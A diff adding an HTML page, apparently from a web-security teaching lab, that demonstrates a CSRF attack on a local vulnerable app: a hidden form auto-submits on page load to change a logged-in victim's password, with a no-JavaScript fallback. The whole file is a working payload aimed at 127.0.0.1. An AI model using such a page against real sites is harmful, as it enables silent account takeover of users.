@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<!--
+CSRF Attack Demo
+When a logged-in victim visits this page, it silently submits a form
+to change their password on the VULNERABLE app (port 5000).
+
+Usage:
+  1. Log in to http://127.0.0.1:5000 as alice in one browser tab.
+  2. Open this HTML file in the same browser (file:// or any origin).
+  3. The form auto-submits and alice's password is changed to "hacked123".
+-->
+<html>
+<head><title>CSRF Demo — 伪造修改密码</title></head>
+<body>
+  <h3>CSRF Attack Demo</h3>
+  <p>This page auto-submits a hidden form to change the victim's password.</p>
+
+  <!-- The form targets the vulnerable app's password-change endpoint.
+       No CSRF token is required there, so any origin can submit it. -->
+  <form id="csrf-form"
+        action="http://127.0.0.1:5000/profile/password"
+        method="POST"
+        style="display:none">
+    <input type="hidden" name="new_password" value="hacked123">
+  </form>
+
+  <script>
+    // Auto-submit on page load — victim never sees the form
+    document.getElementById("csrf-form").submit();
+  </script>
+
+  <noscript>
+    <!-- Fallback if JS is disabled -->
+    <p>JavaScript is disabled. Click the button to trigger the attack manually.</p>
+    <form action="http://127.0.0.1:5000/profile/password" method="POST">
+      <input type="hidden" name="new_password" value="hacked123">
+      <button type="submit">Submit (manual)</button>
+    </form>
+  </noscript>
+</body>
+</html>
